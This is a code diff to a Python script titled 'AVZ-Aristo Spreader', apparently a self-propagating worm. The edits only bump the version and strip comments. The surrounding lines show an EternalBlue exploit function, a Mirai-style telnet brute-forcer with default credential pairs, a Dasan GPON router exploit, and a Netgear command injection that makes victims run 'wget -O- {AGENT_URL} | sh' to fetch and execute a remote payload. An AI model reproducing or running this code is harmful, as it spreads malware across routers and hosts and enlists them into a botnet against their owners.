@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v29.0 – Full Arsenal
+# AVZ-Aristo Spreader v29.0.1 – no emoji, all vectors
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, traceback, shutil, tempfile, hashlib, base64, glob
 from datetime import datetime, timezone, timedelta
 
@@ -260,7 +260,6 @@ async def eternalblue_exploit(ip):
     return False
 
 async def mirai_telnet(ip):
-    # 61 пароля Mirai
     mirai_creds = [
         ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"), ("root","pass"),
         ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin","1234"),
@@ -291,7 +290,6 @@ async def mirai_telnet(ip):
     return False
 
 async def router_exploit_dasan(ip):
-    # CVE-2018-10561/CVE-2018-10562 Dasan GPON
     try:
         async with aiohttp.ClientSession() as s:
             async with s.get(f"http://{ip}/cgi-bin/login.asp?Username=admin&Password=admin", timeout=3) as resp:
@@ -304,7 +302,6 @@ async def router_exploit_dasan(ip):
     return False
 
 async def router_exploit_netgear(ip):
-    # CVE-2024-12847 Netgear DGN1000
     try:
         async with aiohttp.ClientSession() as s:
             async with s.get(f"http://{ip}/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget -O- {AGENT_URL} | sh", timeout=3) as resp:
